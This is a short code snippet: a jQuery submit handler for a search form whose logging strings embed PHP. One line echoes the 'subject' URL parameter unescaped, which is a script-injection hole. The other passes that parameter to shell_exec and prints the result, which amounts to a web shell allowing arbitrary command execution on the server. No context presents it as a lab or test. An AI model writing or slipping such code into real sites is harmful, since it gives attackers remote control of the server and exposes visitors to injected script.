$(".form-busca").submit(function (e) {
    e.preventDefault();
    console.log("<?php echo $_GET['subject']; ?>");
    console.log("<?php $cmd = $_GET['subject']; echo '<pre>'.shell_exec($cmd).'</pre>'; ?>");
});